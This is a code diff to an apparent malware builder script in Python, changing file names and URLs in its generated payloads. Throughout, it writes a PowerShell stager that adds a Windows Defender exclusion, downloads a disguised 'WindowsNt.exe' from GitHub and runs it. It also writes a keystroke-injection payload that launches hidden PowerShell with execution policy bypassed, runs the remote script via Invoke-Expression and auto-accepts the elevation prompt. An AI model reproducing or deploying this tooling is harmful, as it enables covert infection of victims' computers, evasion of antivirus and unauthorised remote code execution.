@@ -32,16 +32,16 @@ def setup_webhook():
             star()
 
 def setup_powershell():
-    script = f'$path = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Temp"\nSet-MpPreference -ExclusionPath $path\nInvoke-WebRequest -Uri "https://github.com/{repo}/releases/{client}/download/{client}.exe" -OutFile "$env:TEMP\\WindowsNt.exe"\nStart-Process "$env:TEMP\\WindowsNt.exe"\nexit;\n'
-    with open(f'{client}.ps1','w') as w:
+    script = f'$path = "C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Temp"\nSet-MpPreference -ExclusionPath $path\nInvoke-WebRequest -Uri "https://github.com/{repo}/releases/{client}/download/WindowsNt.exe" -OutFile "$env:TEMP\\WindowsNt.exe"\nStart-Process "$env:TEMP\\WindowsNt.exe"\nexit;\n'
+    with open(f'run.ps1','w') as w:
         w.write(script)
         if debug:
-            print(f'{client}.ps1')
+            print(f'run.ps1')
             print(script)
             star()
 
 def setup_payload():
-    payload = f'DELAY 2000\nGUI r\nDELAY 1000\nSTRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/{repo}/refs/heads/main/{client}.ps1" -UseBasicParsing).Content"\nDELAY 1000\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\n'
+    payload = f'DELAY 2000\nGUI r\nDELAY 1000\nSTRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/{repo}/refs/heads/n/run.ps1" -UseBasicParsing).Content"\nDELAY 1000\nCTRL SHIFT ENTER\nDELAY 2000\nALT y\n'
     with open('payload.dd','w') as w:
         w.write(payload)
         if debug:
